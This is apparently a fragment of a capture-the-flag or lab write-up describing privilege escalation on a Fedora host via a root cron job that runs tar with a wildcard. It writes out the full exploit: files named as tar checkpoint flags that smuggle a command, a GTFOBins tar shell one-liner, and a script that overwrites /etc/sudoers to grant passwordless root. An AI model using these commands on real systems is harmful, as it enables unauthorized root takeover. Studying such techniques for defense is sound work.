There is an interesting crontab which is run every minutes.

[alfredo@fedora etc]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *

Though it looks safe, it's actually not. The final code uses *, which just parses all files in the directory. Therefore, it gonna be like...

targ czf /tmp/flask.tar.gz file1 file2 file3 file4 ... #All files in /home/alfredo/restapi

Therefore, if we create malicious file name in the dir /home/alfredo/restapi, we can use arbitrary flag for tar file.

Also, GTFOBins says tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh may drop shell for us.

[alfredo@fedora restapi]$ echo 'a' > '--checkpoint=1'
[alfredo@fedora restapi]$ echo 'a' > '--checkpoint-action=exec=sh rev.sh'
[alfredo@fedora restapi]$ nano rev.sh
#!/bin/sh
echo 'alfredo ALL=(root) NOPASSWD: ALL' > /etc/sudoers'
[alfredo@fedora restapi]$ chmod +x rev.sh
